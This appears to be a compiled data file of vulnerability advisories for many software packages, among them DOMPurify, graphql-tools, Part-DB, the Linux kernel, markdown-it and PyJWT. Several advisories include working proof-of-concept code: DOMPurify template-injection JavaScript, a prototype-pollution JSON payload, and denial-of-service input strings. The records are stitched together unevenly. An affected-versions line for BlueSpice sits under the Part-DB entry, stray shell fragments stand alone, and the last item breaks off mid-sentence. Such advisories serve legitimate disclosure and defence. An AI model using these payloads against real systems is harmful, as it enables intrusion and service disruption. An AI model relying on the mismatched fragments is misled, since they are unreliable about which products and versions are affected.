items.summary: Part-DB is an open source inventory management system for electronic components. Prior to version 2.12.1, the part attachment upload handler stores uploaded files under the web-served media directory using the client-supplied file extension, and its extension blocklist does not include phar. AttachmentSubmitHandler::renameBlacklistedExtensions() rewrites dangerous extensions (php, phtml, sh, cgi, py, js, html, htaccess, ...) to .txt, but phar is absent from the list, so a .phar file keeps its extension. Public attachments (the default) are written into public/media/, which is the Apache document root. The shipped Apache configuration routes .phar to PHP-FPM, so the stored file is executed as PHP on request. The per-attachment-type extension filter is empty by default and is not consulted by the upload handler in a way that blocks this, and a non-admin user in the default users group can create an attachment type with no filter and attach files to parts. Any authenticated user in the default users group uploads a .phar attachment to a part and fetches it under /media/, executing arbitrary PHP as the www-data web user. Ability to exploit depends on the webserver config, docker image contained the vulnerability by default. This issue has been patched in version 2.12.1.

This issue affects BlueSpice: from 5.2.3 before 5.2.7, and the 5.2.7 container images published before 2026-10-19 15:37 UTC.

items.summary: OCO-Server is a self-hosted endpoint management application for computer inventory, software deployment, and mobile device management. Prior to 1.2.3,the Apple MDM enrollment endpoint `frontend/api-mdm.php` verifies the signed enrollment-request plist with `openssl_pkcs7_verify(..., PKCS7_NOVERIFY, ...)`. `PKCS7_NOVERIFY` disables signer certificate chain and trust validation, so the signature only has to be self-consistent with whatever certificate is embedded in the PKCS#7 blob. A self-signed certificate from an unrelated attacker is accepted. Because the endpoint trusts the `SERIAL` field taken from the unverified payload, anyone who knows a registered device's serial number can sign a forged plist (`SERIAL` = victim device, attacker-chosen `UDID`) with an arbitrary self-signed certificate; POST it unauthenticated to `/api-mdm.php/profile` (Content-Type: `application/pkcs7-signature`); and receive the victim device's freshly minted MDM identity: a certificate with `CN=<serial>` issued by the server's internal MDM device CA, bundled with its private key in a PKCS#12 payload inside the returned `.mobileconfig` enrollment profile. Additionally, the victim's `mobile_device` database row is silently overwritten with the attacker-supplied `UDID` (device-record hijack). With the stolen certificate and key, the attacker can impersonate the victim device on all subsequent MDM traffic (`/checkin`, `/mdm`, `/parameters`), which authenticate callers by the certificate CN (the serial number) via `checkSignature()` in the same file. This yields control over the victim device's MDM relationship: reading its management data, replacing its push token, and disrupting or redirecting its enrollment. Version 1.2.3 fixes the issue.

items.summary:
## Summary

When DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.

## Root Cause

`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.

```text
_scrubTemplateExpressions (src/purify.ts:1717-1751):
  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).
  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).
  - Explicit recursion at lines 1743-1750 enters <template>.content only, via
    querySelectorAll('template'); there is no equivalent recursion into attached
    shadow roots.
Shadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which
applies the per-node strip but never performs the post-walk normalize-and-rescrub.
```

Shadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.

## Impact

An attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `<template shadowrootmode="open">` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.

## Proof of Concept

```text
Preconditions:
  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).
  - A browser (or DOM implementation) with shadow DOM support.
  - Application constructs a DOM node with an attached shadow root before sanitizing,
    and later evaluates the shadow root's text content as a template.
```

Build a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:

```javascript
const host = document.createElement('div');
const root = host.attachShadow({ mode: 'open' });

// Split "${alert(document.domain)}" so no single fragment matches a regex.
// <object> is not in the default ALLOWED_TAGS and is removed during sanitization,
// leaving the surrounding text-node siblings adjacent.
root.appendChild(document.createTextNode('$'));
root.appendChild(document.createElement('object'));
root.appendChild(document.createTextNode('{alert(document.domain)}'));

DOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });

// After the disallowed element is removed, the fragments are adjacent and survive.
host.shadowRoot.normalize();
console.log(host.shadowRoot.textContent);
```

```text
${alert(document.domain)}
```

A downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.

## Attack Chain

1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.
2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.
3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.
4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `<template>.content` only).
5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.
6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.

## Bypass Evidence

The relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `<template>.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `<%` or `%>`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `<template>.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.

## Affected Versions

- **Ecosystem:** `npm`
- **Package:** `dompurify`
- **Confirmed affected range:** `>= 3.4.4, <= 3.4.16`
- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))
- **Fix status:** not fixed

The lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `<template>.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.

## Suggested Fix

Enforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `<template>.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `<template>.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.

---

Reported by zx (GitHub: @manus-pi).

librsvg will no longer free xmlEntity pointers that libxml2 is still
using.

The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.

Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.

This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/utils` (npm, `pkg:github/ardatan/graphql-tools`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `mergeIncrementalResult` / `setObjectKeyPath` (`packages/utils/src/mergeIncrementalResult.ts`) |
| Vulnerability class | Prototype pollution (via unvalidated object path traversal) |
| Verified against | Source read at `134d67ae36a559651f43ec7fe4a9da76f4a00c2b`; `master` HEAD `ccca0ff0dc8ea20726fd116b2f19a38709c30e62`; published npm builds 10.10.0, 10.10.1, 11.0.0, 12.0.0, 12.0.1 |
| Affected versions | `@graphql-tools/utils` >= 10.10.1 through the scanned 12.0.0 source; introduced by `fbb58b51c4993ba9680ce6c2ef7203ab3a142713` ("remove dset dependency"). 12.0.1 also reproduces. 10.10.0 does not. |
| API surface | Public, documented export (`packages/utils/src/index.ts:55`) |
| Affected in default configuration | Yes — no options are involved; the forbidden-key check in `setObjectKeyPath` is the only defense and it is on by default |

## Summary

`mergeIncrementalResult` merges an incremental GraphQL response part into an accumulated execution result by walking `['data', ...incrementalResult.path]` and assigning at the resolved location. `setObjectKeyPath` tries to reject dangerous segments with strict string equality against `'__proto__'`, `'constructor'` and `'prototype'` (lines 50-52 and 60-62), but it never validates that a path segment is a primitive string or number. A JSON path segment such as `["__proto__"]` is an array object, so `["__proto__"] !== '__proto__'` and the guard passes; the very next statement does `current[key]`, whose `ToPropertyKey` coercion turns that array into the string key `"__proto__"` and resolves `Object.prototype`. The following, innocuous-looking segment is then assigned directly onto `Object.prototype`.

In a consuming app, `incrementalResult` is the response part being merged — data parsed from an upstream `@defer`/`@stream` multipart or incremental-delivery response from another GraphQL server or transport. The `ExecutionResult` TypeScript annotation is not a runtime check, so a malicious, compromised, or MITM'd upstream can choose the `path` value and therefore choose global prototype keys and values in the gateway or client process.

Comparable paths through the same helper, for contrast:

- Plain string segment `"__proto__"` -> blocked by strict equality, lines 50-52 (confirmed by a control case in testing)
- Array segment `["__proto__"]` -> **unsafe: passes the guard at lines 50-52, then coerced to the `__proto__` key at lines 53-57**
- Same operation in 10.10.0 and earlier, which used `dset` -> not exploitable (0/5 attack payloads succeeded)

## Impact

A malicious incremental GraphQL response can add arbitrary properties with attacker-chosen values to `Object.prototype` in the consuming Node.js process. Because every plain object inherits from it, this can change authorization and configuration checks and the behavior of unrelated code elsewhere in the process — a networked PoC set `Object.prototype.isAdmin = true` and `Object.prototype.ownerEmail`, after which a consumer-style check `opts.isAdmin === true` on a freshly created `{}` returned `true`.

The delta over the safe behaviour: without this traversal flaw, a hostile upstream response can only influence the GraphQL data returned to the caller — a bounded, in-band effect. With `path: [["__proto__"], "isAdmin"]`, the write lands on `Object.prototype`, escaping the response object entirely and affecting objects created later and code that never touches the response.

Scoring note: **this report deliberately carries no CVSS vector.** No score was produced for it, and exploitability depends on the consuming application's data flow — specifically whether it merges incremental results from an upstream it does not control, and how much it relies on inherited defaults. Consumers who are **not** affected: anything on `@graphql-tools/utils` 10.10.0 or earlier (the `dset`-based implementation blocked all tested payloads); processes that freeze `Object.prototype`; and consumers that runtime-validate incremental `path` segments to primitives before calling the helper. Note also that `graphql-tools`' own production code does not call `mergeIncrementalResult` directly — it is exported for consumers assembling incremental transport results.

## Preconditions

1. The consumer calls the public `mergeIncrementalResult` helper on incremental payloads received from another GraphQL server or other untrusted transport. No special options are needed.
2. The incremental payload is not runtime-validated to contain only primitive string/number `path` segments before the call. This is the default: `packages/utils/src/index.ts:55` exports the helper directly, with no runtime validation and no documented warning, and the behaviour is not documented as a caller responsibility.
3. The attacker can return a malformed incremental `path` value — i.e. controls, has compromised, or can MITM the upstream subgraph/transport.
4. The process has not frozen `Object.prototype`.

This requires **no** non-standard usage, monkey-patching, or unusual configuration: the documented happy path of the exported helper is affected. The only defense present in the code is the strict-equality forbidden-key check added at lines 50 and 60, which itself shows the author treats these path segments as untrusted input. No documentation warning about the trust requirement was found (documentation review is limited to the exported symbol at `packages/utils/src/index.ts:55`; a broader docs audit is **not verified**).

## Data flow

1. **Source** — the attacker-controlled `incrementalResult.path`, taken from the object passed to the public merge helper, is spread into the key path: `const path = ['data', ...(incrementalResult.path ?? [])];` ([`packages/utils/src/mergeIncrementalResult.ts:12`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L12)).
2. **Propagation** — `setObjectKeyPath` compares the unvalidated segment against the forbidden strings with `===` only; a non-primitive segment is never equal to any of them, so it passes unchanged ([`packages/utils/src/mergeIncrementalResult.ts:48-52`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L48-L52)).
3. **Sink** — `current[key]` performs `ToPropertyKey` coercion, turning the array segment `["__proto__"]` into the key `"__proto__"` and resolving `Object.prototype`; the following segment is then assigned on that resolved object: `current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value` ([`packages/utils/src/mergeIncrementalResult.ts:53-57`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L53-L57), sink at [`:59-64`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L59-L64)).
4. **Reachability** — the entry point is the public API `mergeIncrementalResult({ incrementalResult, executionResult })`, exported directly at [`packages/utils/src/index.ts:55`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/index.ts#L55) for consumers that assemble incremental transport results. Testing confirmed the `data`, `items` (`@stream`) and recursive `incremental[]` branches are all affected.

## Vulnerable code

`packages/utils/src/mergeIncrementalResult.ts`, lines 12-64 at `134d67ae36a559651f43ec7fe4a9da76f4a00c2b` (extract; the `...` markers are elisions of intervening lines, not source text):

```ts
const path = ['data', ...(incrementalResult.path ?? [])];
...
const key = keyPath[i];
if (key === '__proto__' || key === 'constructor' || key === 'prototype') return;
if (current[key] == null) current[key] = ...;
current = current[key];
...
current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value;
```

- The guard line (`key === '__proto__' || ...`, lines 50-52) is the intended defense; it is safe only for primitive string segments.
- `current = current[key]` (lines 53-57) is where a non-primitive segment is coerced into a forbidden key — this is the traversal that escapes the response object.
- `current[finalKey] = ...` (lines 59-64) is the sink: the write that lands on `Object.prototype`.
- The final-segment check at lines 60-62 repeats the same strict-equality pattern and has the same weakness.

## Reproduction

**Verified — reproduced dynamically, not only by inspection.** Three independent reproductions were run:

1. **Source level.** `packages/utils/src/{mergeIncrementalResult,mergeDeep,helpers}.ts` were copied from `master` unchanged except for retargeting relative `.js` import specifiers to `.ts`, then run under `node --experimental-strip-types --test`. 5/5 tests pass, including a control proving that the plain-string `"__proto__"` segment **is** blocked, while the payload `{"path":[["__proto__"],"polluted"],"data":{"pwned":true}}` sets `Object.prototype.polluted = {pwned: true}` and leaves the `executionResult` as `{"data":{}}`. The `data`, `items` (`@stream`) and recursive `incremental[]` branches are all affected.
2. **Published artifacts.** The same attacks were run against the real npm dist builds: 10.10.0 = 0/5 attacks succeed (still uses `dset`, which blocks it); 10.10.1, 11.0.0, 12.0.0 and 12.0.1 = 5/5 attacks succeed. This differential confirms the affected range and that `fbb58b51c4993ba9680ce6c2ef7203ab3a142713` introduced the issue; that commit is still the last one touching the file on `master`, so HEAD (`ccca0ff0dc8ea20726fd116b2f19a38709c30e62`) is unfixed.
3. **Real call site over the network.** A local HTTP server returned a spec-shaped `multipart/mixed` `@defer` response whose deferred patches carry `path: [["__proto__"],"isAdmin"]`. The client only `JSON.parse()`d the chunks and called the public `mergeIncrementalResult()`. Afterwards `Object.getOwnPropertyNames(Object.prototype)` contains `isAdmin` and `ownerEmail`, `({}).isAdmin === true`, and a consumer-style check `opts.isAdmin === true` on a fresh `{}` returns `true`.

Minimal standalone reproduction:

```ts
import { mergeIncrementalResult } from '@graphql-tools/utils';

const executionResult = { data: {} };
const incrementalResult = JSON.parse('{"path":[["__proto__"],"polluted"],"data":"yes"}');
mergeIncrementalResult({ incrementalResult, executionResult });
console.log(({} as any).polluted); // expected vulnerable output: yes
delete (Object.prototype as any).polluted;
```

Steps: run the above under Node against the built `@graphql-tools/utils` package, then inspect a freshly created object after the merge.

- **Expected:** the helper rejects the malformed path; `({} as any).polluted` remains `undefined` and no property is added to `Object.prototype`.
- **Actual:** the write lands on `Object.prototype`; `({} as any).polluted` is `"yes"` on a fresh object, while `executionResult` is left as `{"data":{}}`.

## Suggested remediation

Validate the type of every path segment before it is used for property access, so that only primitive string/number keys ever reach bracket access — and compare against the forbidden names only after that validation.

```ts
function isSafeKey(key: unknown): key is string | number {
  if (typeof key !== 'string' && typeof key !== 'number') return false;
  return key !== '__proto__' && key !== 'constructor' && key !== 'prototype';
}

// walking segment
const key = keyPath[i];
if (!isSafeKey(key)) return;
if (!Object.prototype.hasOwnProperty.call(current, key) || current[key] == null) {
  current[key] = ...;
}
current = current[key];

// final segment
if (!isSafeKey(finalKey)) return;
current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value;
```

A stronger variant, if it fits the project's style: build intermediate containers with `Object.create(null)` and use own-property access (`Object.prototype.hasOwnProperty.call`) throughout the walk, so an inherited property can never be resolved or written even if a future guard is missed.

Notes:

- The final-segment check (lines 60-62) needs the same treatment as the walking check (lines 50-52); patching only one leaves the other reachable.
- All three branches that reach this sink — `data`, `items` (`@stream`) and the recursive `incremental[]` handling — are affected by the same helper and are fixed together by validating in `setObjectKeyPath`.
- Nothing outside this helper appears to need changing: 10.10.0 and earlier, which delegated to `dset`, were not exploitable by any of the tested payloads, so the regression is confined to the hand-rolled traversal added in `fbb58b51c4993ba9680ce6c2ef7203ab3a142713`.
- Whether a released fix or backport policy is wanted for the 10.x and 11.x lines is the maintainers' call; no fix, advisory, or upstream issue currently exists for this.

Suggested regression test alongside the existing tests for `mergeIncrementalResult` (exact spec file path: **unknown** — not identified in this review): assert that merging `{"path":[["__proto__"],"polluted"],"data":"yes"}` leaves `({} as any).polluted` `undefined` and `Object.getOwnPropertyNames(Object.prototype)` unchanged, with a paired control asserting the plain-string `"__proto__"` segment is still rejected, and equivalents for an object-valued segment (e.g. `{"toString":() => "__proto__"}`-style coercion) and for the `items`/`incremental[]` branches.

## Resolution

Fixed in `@graphql-tools/utils@12.0.2`, which is published on npm. `setObjectKeyPath` rejects a path unless every segment is a primitive string or number, and still blocks `__proto__`, `constructor`, and `prototype`. Upgrade to `>=12.0.2`.

items.summary: body-parser is body parsing middleware for Node.js and Express. In versions before 1.20.9 and in versions from 2.0.0 before 2.4.0, a single request can crash any application using body-parser with default options. When a request carries a Content-Encoding such as gzip, body-parser pipes it into a decompression stream and, after reading the body, leaves that stream with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No matching route is required because body parsing runs before routing, so any endpoint that parses a body is affected. The issue is fixed in body-parser 2.4.0 and 1.20.9, and users should upgrade to one of those versions or later. As a workaround, disable request-body inflation (set the body-parser inflate option to false) so encoded requests are rejected before any decompression stream is created.

### Impact

With Cache Components enabled (`cacheComponents: true`), a `'use cache'` function that calls another `'use cache'` function that reads a root param can be keyed incorrectly when the inner call is served from an existing entry: the enclosing function's cache key then omits that root param. Shared cache headers let downstream caches redistribute the content further. 

What values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.

There are no known workarounds. Apps should upgrade to the patched version as soon as possible.

smb/client: validate new EOF for insert range

smb3_insert_range() does not check if the new file size

In the Linux kernel, the following vulnerability has been resolved:

smb/client: fix stale page cache in insert/collapse range

smb3_insert_range() and smb3_collapse_range() use
truncate_pagecache_range() to invalidate the affected page cache.
However, if off or old_eof is not page-aligned, the boundary pages are
only partially zeroed and remain uptodate. As a result, the client may
return stale data after a successful insert/collapse range operation.

For example, with 4K pages:

    page 0          page 1          page 2
    0------4K       4K------8K      8K------12K
       ^                                ^
    off=2K                       old_eof=10K

Page 1 is removed from the page cache, while the boundary pages are
only partially zeroed. After COPYCHUNK moves the data on the server,
these cached pages may still return stale data.

This can be reproduced on a CIFS mount:

    bash -c '
            FILE=/mnt/scratch/repro

            # Use a 6 KiB file so EOF is not page-aligned.
            dd if=/dev/urandom of=/tmp/src bs=1K count=6 status=none

            # Expected: a 4 KiB hole followed by the original data.
            rm -f /tmp/expected
            truncate -s 4K /tmp/expected
            cat /tmp/src >> /tmp/expected

            cp /tmp/src "$FILE"

            # Prime the page cache before moving data on the server.
            cat "$FILE" > /dev/null

            fallocate --insert-range -o 0 -l 4K "$FILE"

            if cmp -s /tmp/expected "$FILE"; then
                    echo "readback: OK"
            else
                    echo "readback: STALE DATA"
            fi
    '

Fix this by writing back dirty data and discarding the page cache from
the start of the page containing off to EOF before moving data on the
server.

smb/client: invalidate fscache for fallocate range operations

                cp /tmp/src "$FILE"

                sync

In the Linux kernel, the following vulnerability has been resolved:

sctp: fix soft lockup from unpadded ASCONF-ACK parameter iteration

sctp_verify_asconf() walks ASCONF-ACK parameters with
sctp_walk_params(), which advances by SCTP_PAD4(length), while the
consumer sctp_get_asconf_response() iterates the same parameters
advancing by the raw length, without padding. A single odd-length
parameter desynchronises the two walks and makes the consumer
interpret attacker-controlled bytes at a misaligned offset.

When those bytes yield a length of zero, the while loop over
asconf_ack_len makes no progress, spinning forever in softirq
context, and the watchdog reports a soft lockup. All reads stay
within the received skb, so the lockup is a pure remote denial of
service. A remote peer can trigger it with a crafted ASCONF-ACK on
an ADD-IP enabled association with an outstanding ASCONF (RFC 5061
section 4.1.2 requires the chunk to be authenticated, but the
predefined empty key id 0 allows the peer to compute the same
association HMAC from publicly exchanged parameters, so the gate
does not help).

The SCTP_PARAM_ERR_CAUSE case of sctp_verify_asconf() also performs
no length check, letting a parameter without a complete error
header reach the consumer, which reads errhdr.cause past the end of
the parameter, an out-of-bounds read.

items.summary:
## Summary

Two independent quadratic paths in the `linkify: true` handling. Both are in markdown-it's own code rather than in linkify-it, which stays linear on both payloads.

`src/rules_core/linkify.ts` calls `arrayReplaceAt` once per linkified text token, and that rebuilds the whole `children` array each time. A paragraph of N soft-broken lines is one inline token with about 2N children, so you get N rebuilds over a 2N array. Schema-less emails are what reach it. A `http://` link gets consumed by the inline rule first and never arrives as a text token, so those stay linear.

`src/rules_inline/linkify.ts` runs `state.pending.match(SCHEME_RE)` at every `://` in the source. `state.pending` only gets truncated once a link is actually produced, so an unregistered scheme leaves it growing and every `://` rescans the lot.

## Proof of concept

Clean install of 15.0.0 from npm, `new MarkdownIt({ linkify: true }).render(payload)`, Node 24.

| N | 5,000 | 10,000 | 20,000 | 40,000 |
|---|---|---|---|---|
| `'a@b.co\n'.repeat(N)`, 34KB to 273KB | 1.1s | 4.7s | 19.6s | 89s |
| `'a://'.repeat(N)`, 20KB to 156KB | 0.25s | 0.76s | 3.1s | 15.0s |

Doubling the input roughly quadruples the time in both. With `linkify: false` the same inputs run in 25 to 131ms and stay flat.

Controls for the first one, all at N=20000: putting every email in a single text token (`'a@b.co '`) takes 0.59s, one email per paragraph (`'a@b.co\n\n'`) takes 0.64s, and soft-broken lines with nothing linkifiable take 42ms. So it needs many children AND many of them linkifying. For the second, replaying just the `SCHEME_RE` calls against the same growing prefixes with no markdown-it involved accounts for 11.7s of the 15s.

Ordinary prose does it too. `'ping a@b.co ok\n'.repeat(20000)` is 293KB and takes 31s.

## Caveat

`linkify` is off by default, so this only reaches apps that turn it on.

## Impact

Availability only. A few hundred KB of fairly ordinary markdown pins one core for tens of seconds, and because it's quadratic it degrades quickly with size. Nothing is read, written or executed.

Externally-Generated Error Message Containing Sensitive Information vulnerability in plug_crypto in elixir-plug plug_crypto allows an unauthenticated remote attacker to expose the secret key base through application logs via a wrong-typed argument. Every public function in Plug.Crypto validates argument types in a function-head guard. A failed guard makes the Erlang VM raise FunctionClauseError with the actual argument values in the top stack frame, so the secret key base, a derived key, or the value an API key is compared against lands in that frame. The library's rescue blocks and Plug.Crypto.prune_args_from_stacktrace/1 only reach exceptions raised inside a function body, so they never see a guard failure. Plug.Cowboy and Bandit write the frame to the error log and attach it as crash_reason Logger metadata, which error trackers forward.

Two entry points take request data. Plug.Crypto.verify/4 exposes the secret key base when the token is neither a binary nor nil, which Phoenix.Token.verify/4 reaches because it forwards the token unguarded. Plug.Crypto.secure_compare/2 exposes the other operand when one side is not a binary, as happens when a missing request header yields nil. Reading the leaked value needs separate access to the logs or the error tracker, so the request alone does not disclose the secret to the attacker.

This issue affects plug: from 1.6.3 before 1.7.0; plug_crypto: from 1.0.0 before 2.2.1.

items.summary: draw.io Desktop is the official Electron build of draw.io. Prior to 31.4.4, draw.io Desktop is vulnerable to arbitrary local-file disclosure through the Electron main process's read-side IPC handlers. The readFile, getFileDrafts, getBkpFile, fileStat, isFileWritable, checkFileExists, and watchFile actions operate on a renderer-chosen filesystem path with no blessed-path (assertWritablePath) authorization. The only gates are validateSender — a URL-prefix origin check — plus, for readFile alone, a content "sniff" and a lexical appBaseDir prefix block. The write-side handlers (saveFile, writeFile, saveDraft, deleteFile) are all protected by assertWritablePath; the read side is not. The result is a read/write authorization asymmetry: any frame executing in the app's file:// origin can read the contents of local files that the same origin is explicitly forbidden to write. This issue is fixed in version 31.4.4.

items.summary:
### Impact

Fastify lowercases header names in a `headers` schema before compilation, because Node.js stores request header names in lowercase. This normalization does not reach the header names held in a `propertyNames` subschema's `enum` and `const`. A header-name deny-list written in the canonical header case, such as `propertyNames: { not: { enum: ['X-Debug-Override'] } }`, therefore never matches the lowercased request headers, and the forbidden header reaches the handler. Any application that uses a `propertyNames` deny-list or allow-list to constrain request header names does not get the constraint it expects. The same rule written in lowercase works, and the `not: { required: [...] }` form is unaffected, so this is a gap in the built-in normalization rather than a wrong schema. This is an incomplete fix of CVE-2026-84428 ([GHSA-9q9j-q6p8-xq58](https://github.com/fastify/fastify/security/advisories/GHSA-9q9j-q6p8-xq58)), whose normalization covered header names used as property keys but not those used as values inside `propertyNames`.

### Patches

Users should upgrade to fastify `5.12.6` or later, which lowercases header names held in `enum` and `const` inside a `propertyNames` subschema so they match the lowercased request headers. Header-name constraints that cannot be normalized automatically, regular expressions (`propertyNames` `pattern` and `patternProperties` keys) and a `$ref` used inside `propertyNames`, are documented and, for the `$ref` case, warned at startup (`FSTSEC003`). Author those to match the lowercased request headers.

### Workarounds

Write the `propertyNames` header-name constraint in lowercase (for example `enum: ['x-debug-override']`), or enforce the header check in an `onRequest` or `preValidation` hook instead of the schema.

items.summary: Authlib is a Python library which builds OAuth and OpenID Connect servers. From 0.13 until 1.8.0, authlib.common.security.is_secure_transport() uses a textual prefix comparison for loopback HTTP exemptions, so a URL whose userinfo begins with a loopback host can be accepted even when its parsed host is an external non-loopback system. An external party able to supply a URL to OIDC RP-Initiated Logout registration, authorization-server metadata validation, or another call site can bypass the TLS-required guard and cause cleartext redirection or acceptance of cleartext endpoints. The issue does not bypass redirect URI exact matching and does not by itself forge tokens or authenticate users. The vulnerable authlib.common.security.is_secure_transport() implementation in authlib/common/security.py misinterprets the userinfo component before OIDC RP-Initiated Logout dynamic client registration and other consumers enforce transport security. This issue is fixed in version 1.8.0.

items.summary: Astro is a web framework for content-driven websites. From 7.1.0 until 7.3.3, Astro's server-side View Transition CSS generator does not keep string animation properties within their generated declarations. An application that passes attacker-controlled data into properties such as duration, delay, easing, direction, fillMode, or animation names can allow CSS delimiters to terminate the declaration and add attacker-selected rules to the server-rendered page. The generated stylesheet still escapes literal less-than characters, so the injected content cannot terminate the style element or directly inject HTML or JavaScript. The injected CSS can conceal or reposition content, add generated text, and otherwise misrepresent the interface; some applications may also expose data already present in selectable DOM attributes through conditional resource loads. This issue is fixed in 7.3.3.

### Summary

`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is
the empty string and returns a zero-length key without raising. When a token is
then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by
`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes
`HMAC(key=b"", signing_input)` and accepts any token an attacker forged with the
